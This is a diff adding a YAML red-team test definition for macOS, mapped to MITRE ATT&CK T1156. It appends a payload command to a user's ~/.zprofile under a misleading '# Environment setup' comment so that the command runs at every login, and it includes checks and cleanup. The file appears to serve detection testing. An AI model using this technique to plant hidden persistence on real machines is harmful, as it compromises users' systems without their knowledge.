@@ -1,0 +1,56 @@
+api_version: 2.0
+uuid: 12345678-7777-7777-7777-777777777777
+name: Modify ~/.zprofile
+description: Modifies zsh profile initialization file for login shell persistence
+mitre_attack_id: T1156
+mitre_attack_technique: .zprofile
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  zprofile_path:
+    description: Path to zsh profile configuration file
+    type: string
+    default: ~/.zprofile
+  backup_path:
+    description: Path to backup the original zprofile
+    type: string
+    default: ~/.zprofile.bak
+  payload_command:
+    description: Command to inject into zprofile
+    type: string
+    default: "/usr/bin/security add-generic-password -a user -s token -w malicious &"
+steps:
+  - name: backup_original_zprofile
+    type: shell_command
+    command: "cp {{ zprofile_path }} {{ backup_path }} 2>/dev/null || true"
+  
+  - name: inject_into_zprofile
+    type: shell_command
+    command: |
+      if [ ! -f "{{ zprofile_path }}" ]; then
+        touch {{ zprofile_path }}
+      fi
+      echo "" >> {{ zprofile_path }}
+      echo "# Environment setup" >> {{ zprofile_path }}
+      echo "{{ payload_command }}" >> {{ zprofile_path }}
+
+checks:
+  - type: file_exists
+    path: "{{ zprofile_path }}"
+  - type: file_contains
+    path: "{{ zprofile_path }}"
+    value: "{{ payload_command }}"
+
+cleanup:
+  - type: shell_command
+    command: |
+      if [ -f "{{ backup_path }}" ]; then
+        cp {{ backup_path }} {{ zprofile_path }}
+        rm {{ backup_path }}
+      else
+        sed -i '' '/# Environment setup/,+1d' {{ zprofile_path }}
+      fi
